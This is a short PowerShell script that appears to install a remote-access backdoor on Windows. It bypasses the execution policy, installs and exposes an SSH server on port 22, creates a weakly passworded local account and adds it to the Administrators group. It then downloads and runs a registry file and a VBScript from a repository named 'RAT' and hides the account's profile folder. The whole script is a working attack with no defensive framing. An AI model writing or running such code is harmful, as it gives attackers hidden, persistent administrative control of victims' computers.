
Get-ExecutionPolicy -List

Set-ExecutionPolicy Bypass

Get-ExecutionPolicy -List



# Install the OpenSSH Client
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0

# Install the OpenSSH Server
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0


# Start the sshd service
Start-Service sshd

# OPTIONAL but recommended:
Set-Service -Name sshd -StartupType 'Automatic'

# Confirm the Firewall rule is configured. It should be created automatically by setup. Run the following to verify
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..."
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
} else {
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists."
}



 New-LocalUser -Name "jarbouu3" -Password (ConvertTo-SecureString "1234" -AsPlainText -Force) -FullName "dummy xd" -Description "idk"


net user Broo test 

net localgroup Administrateurs jarbouu3 /add 


Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/wreg.reg -OutFile "wreg.reg"


Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/hello.vbs -OutFile "hello.vbs"


.\wreg.reg; .\hello 

cd C:\Users
attrib +h +s +r Broo


Restart-Service sshd

exit

